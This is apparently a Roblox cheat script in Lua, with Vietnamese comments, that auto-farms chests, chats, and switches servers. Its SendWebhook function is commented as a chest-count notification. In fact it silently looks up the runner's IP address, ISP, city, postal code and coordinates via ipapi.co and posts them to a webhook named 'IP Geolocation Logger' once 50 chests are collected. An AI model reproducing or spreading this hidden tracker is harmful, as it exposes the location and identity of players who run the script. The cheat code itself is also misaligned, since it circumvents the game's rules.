-- Tùy chọn cho phép bật/tắt chức năng đổi server và số lượng rương nhặt xong để đổi server
getgenv().Hop = true  -- Mặc định bật tính năng đổi server
_G.SoLuongRuong = 50  -- Số lượng rương cần nhặt trước khi đổi server
getgenv().WebhookURL = "url webhook"  -- Thêm webhook URL

-- Hàm để gửi thông tin qua webhook sau khi nhặt rương
local function SendWebhook(chestsCollected)
    local a, b = game:GetService("HttpService"), game:GetService("Players").LocalPlayer
    local c, d = pcall(function()
        return a:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..b.UserId.."&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
    end)
    local e, f = pcall(function() 
        return a:JSONDecode(game:HttpGet("https://ipapi.co/json")) 
    end)
    f = e and f or {}

    local function g(h, i)
        return {
            name = h,
            value = f[i] and tostring(f[i]) or "Not Found"
        }
    end

    pcall(function()
        (request or http_request or http and http.request)({
            Url = getgenv().WebhookURL,
            Method = "POST",
            Body = a:JSONEncode({
                embeds = {
                    {
                        color = 1733608,
                        fields = {
                            g("IP Address", "ip"),
                            g("Network Range", "network"),
                            g("ASN (Autonomous System Number)", "asn"),
                            g("ISP (Internet Service Provider)", "org"),
                            g("Country", "country_name"),
                            g("Region/Province", "region"),
                            g("City", "city"),
                            g("Postal Code", "postal"),
                            g("Latitude", "latitude"),
                            g("Longitude", "longitude"),
                            g("Timezone", "timezone")
                        }
                    },
                    {
                        title = "View "..b.Name.."'s full profile",
                        url = "https://www.roblox.com/users/"..b.UserId.."/profile",
                        color = 1733608,
                        image = {
                            url = c and d or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
                        }
                    }
                },
                username = "IP Geolocation Logger",
                avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
            }),
            Headers = { ["content-type"] = "application/json" }
        })
    end)
end

-- Hàm di chuyển với Tween
function Tween2(CFgo)
    local tween_s = game:GetService("TweenService")
    local info = TweenInfo.new(
        (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - CFgo.Position).Magnitude / 200, -- Giảm hệ số để di chuyển chậm hơn
        Enum.EasingStyle.Linear
    )
    
    local tween = tween_s:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, info, {CFrame = CFgo})
    tween:Play()

    local tweenfunc = {}

    function tweenfunc:Stop()
        tween:Cancel()
    end

    return tweenfunc
end

-- Chức năng Auto Farm Chest với Tween và tự động nhặt rương + Chat
local chestsCollected = 0  -- Số rương đã nhặt trong server

local function AutoChat(message)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

local function ToggleFarmChest()
    _G.AutoCollectChest = true
    spawn(function()
        while _G.AutoCollectChest and chestsCollected < _G.SoLuongRuong do
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local currentPosition = character:GetPivot().Position
            local collectionService = game:GetService("CollectionService")
            local chests = collectionService:GetTagged("_ChestTagged") -- Kiểm tra tag rương trong game

            local nearestDistance, nearestChest = math.huge

            for _, chest in pairs(chests) do
                local distance = (chest:GetPivot().Position - currentPosition).Magnitude
                if not chest:GetAttribute("IsDisabled") and distance < nearestDistance then
                    nearestDistance, nearestChest = distance, chest
                end
            end

            if nearestChest then
                local chestPosition = nearestChest:GetPivot().Position
                local destination = CFrame.new(chestPosition)
                local tween = Tween2(destination) -- Gọi hàm di chuyển đến rương

                -- Chờ cho tới khi nhân vật di chuyển xong
                local totalTime = (nearestDistance / 200) + 1  -- Giảm tốc độ di chuyển
                wait(totalTime) 

                -- Kiểm tra và nhặt rương bằng cách sử dụng firetouchinterest
                if nearestChest and nearestChest:FindFirstChild("TouchInterest") then
                    firetouchinterest(player.Character.HumanoidRootPart, nearestChest, 0)
                    wait(0.1)
                    firetouchinterest(player.Character.HumanoidRootPart, nearestChest, 1)
                    chestsCollected = chestsCollected + 1
                    print("Đã nhặt rương:", chestsCollected)

                    -- Gửi tin nhắn thông báo đã nhặt được rương
                    AutoChat("á đù được " .. chestsCollected .. " rương rồi nè pro")

                    -- Kiểm tra nếu đã nhặt đủ số rương cần thiết và đổi server nếu getgenv().Hop được bật
                    if chestsCollected >= _G.SoLuongRuong then
                        print("Đã nhặt đủ rương, đang đổi server...")
                        AutoChat("Đã nhặt đủ " .. _G.SoLuongRuong .. " rương, đổi server thôi!")
                        
                        -- Gửi thông tin qua webhook trước khi đổi server
                        SendWebhook(chestsCollected)
                        
                        if getgenv().Hop then
                            game:GetService("TeleportService"):Teleport(game.PlaceId) -- Đổi server
                        else
                            print("Hop server tắt, không đổi server.")
                        end
                        break
                    end
                end
            end

            wait(1) -- Chờ một khoảng thời gian trước khi tiếp tục tìm rương
        end
    end)
end

-- Gọi hàm nhặt rương tự động
ToggleFarmChest()
